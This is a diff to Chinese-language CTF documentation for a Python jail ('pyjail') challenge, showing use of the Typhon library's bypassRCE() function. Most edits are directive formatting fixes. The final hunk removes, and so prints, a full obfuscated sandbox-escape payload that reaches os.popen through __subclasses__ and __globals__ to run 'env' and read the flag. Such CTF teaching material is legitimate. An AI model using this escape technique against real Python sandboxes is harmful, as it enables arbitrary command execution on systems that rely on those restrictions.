@@ -124,7 +124,7 @@ Typhon-Sample Pyjail 1
 
 本题目由此文档编写。
 
-..code-block:: python
+.. code-block:: python
     :linenos:
     :emphasize-lines: 1,23,36
 
@@ -178,7 +178,7 @@ Typhon-Sample Pyjail 1
 
 我们可以利用 ``Typhon`` 库中的 ``bypassRCE()`` 函数绕过限制。由于flag在环境中，我们执行 ``env`` 即可得到flag。
 
-..code-block:: python
+.. code-block:: python
     :linenos:
     :emphasize-lines: 23,36
 
@@ -190,7 +190,7 @@ Typhon-Sample Pyjail 1
                                         'pty','uuid','future','codecs','io','multi']
             )
 
-.. tips::
+.. tip::
 
     此处由于已经指定了命名空间，我们可以不在源代码上做修改，直接另起一个脚本调用 ``Typhon.bypassRCE()`` 函数。但当题目没有指定命名空间时（即没有 ``local_scope`` 参数时），我们需要在源代码中调用 ``Typhon.bypassRCE()`` 函数。
     假如你不确定的话，也可以只在源代码中调用。
@@ -198,6 +198,7 @@ Typhon-Sample Pyjail 1
 执行上述代码，即可得到payload。
 
 .. note:: 
+
     对于复杂度较高的题目，可能需要等候较长时间。
 
 .. code-block::
@@ -335,4 +336,7 @@ Typhon-Sample Pyjail 1
     Reminder: index 111 of st.__doc__[111] must match the string literal v.
     Reminder: 110 is the index of StreamReaderWriter, path to sys must fit in index of StreamReaderWriter
 
-根据 ``reminder`` 信息稍微调整payload即可利用 ``().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))).modules.get(st.__doc__.__getitem__(0b100).__add__(st.__doc__.__getitem__(0))).popen(st.__doc__.__getitem__(0b111).__add__(st.__doc__.__getitem__(0b101101)).__add__(st.__doc__.__getitem__(111))).read()`` 得到flag。
+
+    +++++++++++Jail broken+++++++++++
+
+根据 ``reminder`` 信息稍微调整payload即可得到flag。
